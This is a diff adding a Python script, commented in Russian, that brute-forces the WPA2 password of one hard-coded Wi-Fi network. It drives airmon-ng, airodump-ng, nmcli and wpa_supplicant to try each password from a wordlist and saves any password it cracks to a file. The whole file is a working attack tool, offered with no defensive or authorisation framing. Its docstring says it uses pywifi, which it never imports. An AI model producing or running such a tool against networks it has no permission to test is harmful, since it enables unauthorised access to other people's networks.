@@ -1,0 +1,401 @@
+#!/usr/bin/env python3
+"""
+WiFi Password Cracker для Kali Linux
+Использует pywifi для подбора паролей из wordlist
+"""
+
+import subprocess
+import time
+import os
+import sys
+import threading
+from datetime import datetime
+
+# Конфигурация
+TARGET_SSID = "kv216"  # Имя сети для взлома
+WORDLIST_FILE = "quick_list.txt"  # Файл с паролями
+INTERFACE = "wlan0"  # Wi-Fi интерфейс
+TIMEOUT_PER_PASSWORD = 5  # Секунд на попытку подключения
+SCAN_TIME = 10  # Время сканирования сетей
+
+class WiFiCracker:
+    def __init__(self):
+        """Инициализация"""
+        self.stop_flag = False
+        self.found_password = None
+        self.attempts = 0
+        self.start_time = None
+        
+        print(f"""
+╔═══════════════════════════════════════╗
+║    WiFi Password Cracker              ║
+║    Target: {TARGET_SSID:<20} ║
+║    Wordlist: {WORDLIST_FILE:<18} ║
+╚═══════════════════════════════════════╝
+        """)
+        
+        # Проверка root
+        if os.geteuid() != 0:
+            print("[-] Запустите с sudo!")
+            sys.exit(1)
+        
+        # Проверка файла wordlist
+        if not os.path.exists(WORDLIST_FILE):
+            print(f"[-] Файл {WORDLIST_FILE} не найден!")
+            print(f"[!] Создайте файл или укажите другой путь")
+            sys.exit(1)
+    
+    def check_wifi_interface(self):
+        """Проверка Wi-Fi интерфейса"""
+        print("[*] Проверка Wi-Fi интерфейса...")
+        
+        try:
+            # Проверяем доступные интерфейсы
+            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
+            
+            if INTERFACE not in result.stdout:
+                print(f"[-] Интерфейс {INTERFACE} не найден!")
+                print("[+] Доступные интерфейсы:")
+                for line in result.stdout.split('\n'):
+                    if 'IEEE' in line:
+                        print(f"    {line.split()[0]}")
+                return False
+            
+            print(f"[+] Интерфейс {INTERFACE} найден")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Ошибка проверки интерфейса: {e}")
+            return False
+    
+    def scan_for_target(self):
+        """Сканирование для поиска целевой сети"""
+        print(f"[*] Сканирование сетей для поиска '{TARGET_SSID}'...")
+        
+        try:
+            # Включаем мониторный режим
+            print("[*] Включаю режим монитора...")
+            subprocess.run(["airmon-ng", "check", "kill"], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["airmon-ng", "start", INTERFACE], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            monitor_iface = f"{INTERFACE}mon"
+            
+            # Сканируем сети
+            print(f"[*] Сканирую {SCAN_TIME} секунд...")
+            cmd = ["airodump-ng", monitor_iface, "--write", "/tmp/scan", 
+                   "--output-format", "csv"]
+            
+            scan_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
+                                        stderr=subprocess.DEVNULL)
+            
+            # Ждем и прерываем
+            time.sleep(SCAN_TIME)
+            scan_proc.terminate()
+            
+            # Читаем результаты
+            if os.path.exists("/tmp/scan-01.csv"):
+                with open("/tmp/scan-01.csv", "r") as f:
+                    content = f.read()
+                    
+                # Ищем целевую сеть
+                lines = content.split('\n')
+                target_found = False
+                
+                for line in lines:
+                    if TARGET_SSID in line:
+                        parts = line.split(',')
+                        if len(parts) > 13:
+                            bssid = parts[0].strip()
+                            channel = parts[3].strip()
+                            power = parts[8].strip() if len(parts) > 8 else "N/A"
+                            
+                            print(f"[+] ЦЕЛЕВАЯ СЕТЬ НАЙДЕНА!")
+                            print(f"    SSID: {TARGET_SSID}")
+                            print(f"    BSSID: {bssid}")
+                            print(f"    Channel: {channel}")
+                            print(f"    Signal: {power} dBm")
+                            target_found = True
+                            break
+                
+                if not target_found:
+                    print(f"[-] Сеть '{TARGET_SSID}' не найдена")
+                    return False
+            else:
+                print("[-] Не удалось просканировать сети")
+                return False
+            
+            # Выключаем мониторный режим
+            subprocess.run(["airmon-ng", "stop", monitor_iface], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            return True
+            
+        except KeyboardInterrupt:
+            print("\n[*] Сканирование прервано")
+            return False
+        except Exception as e:
+            print(f"[-] Ошибка сканирования: {e}")
+            return False
+    
+    def load_passwords(self):
+        """Загрузка паролей из файла"""
+        print(f"[*] Загрузка паролей из {WORDLIST_FILE}...")
+        
+        passwords = []
+        try:
+            with open(WORDLIST_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    pwd = line.strip()
+                    if pwd and len(pwd) >= 8:  # WPA2 требует минимум 8 символов
+                        passwords.append(pwd)
+            
+            if not passwords:
+                print("[-] Нет паролей в файле (требуется минимум 8 символов)")
+                return None
+            
+            print(f"[+] Загружено {len(passwords)} паролей")
+            print(f"[+] Первые 5 паролей: {', '.join(passwords[:5])}")
+            
+            return passwords
+            
+        except Exception as e:
+            print(f"[-] Ошибка загрузки wordlist: {e}")
+            return None
+    
+    def try_connect_nmcli(self, password):
+        """Попытка подключения через nmcli (NetworkManager)"""
+        try:
+            # Удаляем старое подключение если есть
+            subprocess.run(["nmcli", "connection", "delete", TARGET_SSID], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Создаем новое подключение
+            cmd = [
+                "nmcli", "device", "wifi", "connect", TARGET_SSID,
+                "password", password, "ifname", INTERFACE
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_PER_PASSWORD)
+            
+            # Проверяем результат
+            if "successfully activated" in result.stdout or "successfully" in result.stdout:
+                return True
+            elif "Secrets were required" in result.stderr:
+                # Пароль неверный
+                return False
+            else:
+                # Другая ошибка
+                return False
+                
+        except subprocess.TimeoutExpired:
+            return False
+        except Exception as e:
+            return False
+    
+    def try_connect_wpa_supplicant(self, password):
+        """Попытка подключения через wpa_supplicant"""
+        try:
+            # Создаем конфиг файл
+            config = f"""
+network={{
+    ssid="{TARGET_SSID}"
+    psk="{password}"
+}}
+            """
+            
+            with open("/tmp/wpa.conf", "w") as f:
+                f.write(config)
+            
+            # Запускаем wpa_supplicant
+            cmd = [
+                "wpa_supplicant", "-i", INTERFACE, "-c", "/tmp/wpa.conf",
+                "-B"  # Фоновый режим
+            ]
+            
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
+                                   stderr=subprocess.DEVNULL)
+            
+            # Ждем подключения
+            time.sleep(3)
+            
+            # Проверяем статус
+            check_cmd = ["iwconfig", INTERFACE]
+            result = subprocess.run(check_cmd, capture_output=True, text=True)
+            
+            # Убиваем процесс
+            proc.terminate()
+            
+            # Очищаем
+            if os.path.exists("/tmp/wpa.conf"):
+                os.remove("/tmp/wpa.conf")
+            
+            # Проверяем подключение
+            if TARGET_SSID in result.stdout:
+                return True
+            else:
+                return False
+                
+        except Exception as e:
+            # Очистка при ошибке
+            try:
+                os.remove("/tmp/wpa.conf")
+            except:
+                pass
+            return False
+    
+    def display_progress(self):
+        """Отображение прогресса в отдельном потоке"""
+        print("[*] Начинаю подбор пароля...")
+        print("[*] Нажмите Ctrl+C для остановки\n")
+        
+        self.start_time = datetime.now()
+        
+        while not self.stop_flag and self.found_password is None:
+            elapsed = (datetime.now() - self.start_time).seconds
+            speed = self.attempts / max(elapsed, 1)
+            
+            sys.stdout.write(f"\r[⏱️ {elapsed}s] [🔑 {self.attempts}] [⚡ {speed:.1f}/s] Подбор...")
+            sys.stdout.flush()
+            time.sleep(1)
+    
+    def crack(self):
+        """Основной процесс подбора"""
+        
+        # Шаг 1: Проверка интерфейса
+        if not self.check_wifi_interface():
+            return False
+        
+        # Шаг 2: Проверка наличия сети
+        print("\n[*] Проверяю доступность сети...")
+        check_cmd = ["iwlist", INTERFACE, "scan"]
+        try:
+            result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=10)
+            if TARGET_SSID not in result.stdout:
+                print(f"[-] Сеть '{TARGET_SSID}' не найдена в диапазоне")
+                print("[!] Убедитесь, что:")
+                print("    1. Сеть активна")
+                print("    2. Вы в зоне действия")
+                print("    3. SSID указан правильно")
+                return False
+            print(f"[+] Сеть '{TARGET_SSID}' доступна")
+        except:
+            print("[!] Пропускаю проверку сети (может требовать мониторный режим)")
+        
+        # Шаг 3: Загрузка паролей
+        passwords = self.load_passwords()
+        if not passwords:
+            return False
+        
+        # Шаг 4: Запуск потока прогресса
+        progress_thread = threading.Thread(target=self.display_progress)
+        progress_thread.daemon = True
+        progress_thread.start()
+        
+        # Шаг 5: Подбор паролей
+        try:
+            for password in passwords:
+                if self.stop_flag:
+                    break
+                
+                self.attempts += 1
+                
+                # Пробуем подключиться
+                if self.attempts % 10 == 0:
+                    sys.stdout.write(f"\r[⏱️ {(datetime.now() - self.start_time).seconds}s] [🔑 {self.attempts}] Тест: '{password[:20]}'")
+                    sys.stdout.flush()
+                
+                # Пробуем разные методы подключения
+                connected = False
+                
+                # Метод 1: nmcli (самый надежный)
+                connected = self.try_connect_nmcli(password)
+                
+                # Метод 2: wpa_supplicant (если первый не сработал)
+                if not connected:
+                    connected = self.try_connect_wpa_supplicant(password)
+                
+                # Если подключились
+                if connected:
+                    self.found_password = password
+                    self.stop_flag = True
+                    
+                    # Даем время для завершения прогресса
+                    time.sleep(2)
+                    
+                    print(f"\n\n{'='*60}")
+                    print(f"[🎉] ПАРОЛЬ НАЙДЕН!")
+                    print(f"[📶] Сеть: {TARGET_SSID}")
+                    print(f"[🔑] Пароль: {password}")
+                    print(f"[⏱️] Время: {(datetime.now() - self.start_time).seconds} секунд")
+                    print(f"[🔍] Попыток: {self.attempts}")
+                    print(f"{'='*60}")
+                    
+                    # Сохраняем результат
+                    self.save_result(password)
+                    return True
+        
+        except KeyboardInterrupt:
+            print(f"\n\n[*] Подбор остановлен пользователем")
+            self.stop_flag = True
+        except Exception as e:
+            print(f"\n\n[-] Ошибка подбора: {e}")
+            self.stop_flag = True
+        
+        # Если не нашли
+        if not self.found_password:
+            self.stop_flag = True
+            time.sleep(2)  # Даем прогрессу обновиться
+            
+            print(f"\n\n[-] Пароль не найден среди {self.attempts} вариантов")
+            print(f"[-] Затраченное время: {(datetime.now() - self.start_time).seconds} секунд")
+            print("[!] Попробуйте:")
+            print("    1. Расширить wordlist")
+            print("    2. Проверить, активна ли сеть")
+            print("    3. Использовать другие методы атаки")
+        
+        return False
+    
+    def save_result(self, password):
+        """Сохранение результата"""
+        try:
+            filename = f"cracked_{TARGET_SSID}.txt"
+            with open(filename, "w") as f:
+                f.write(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Сеть: {TARGET_SSID}\n")
+                f.write(f"Пароль: {password}\n")
+                f.write(f"Попыток: {self.attempts}\n")
+                f.write(f"Wordlist: {WORDLIST_FILE}\n")
+                f.write("-" * 40 + "\n")
+            
+            print(f"[💾] Результат сохранен в {filename}")
+            
+        except Exception as e:
+            print(f"[-] Ошибка сохранения: {e}")
+
+def main():
+    """Точка входа"""
+    
+    # Создаем экземпляр взломщика
+    cracker = WiFiCracker()
+    
+    # Запускаем взлом
+    success = cracker.crack()
+    
+    # Финальное сообщение
+    if success:
+        print("\n[✅] Успешно взломано!")
+        print(f"[📡] Подключайтесь к {TARGET_SSID} с найденным паролем")
+    else:
+        print("\n[❌] Взлом не удался")
+    
+    print("\n[*] Завершение работы...")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n[!] Программа прервана пользователем")
+    except Exception as e:
+        print(f"\n[!] Критическая ошибка: {e}")
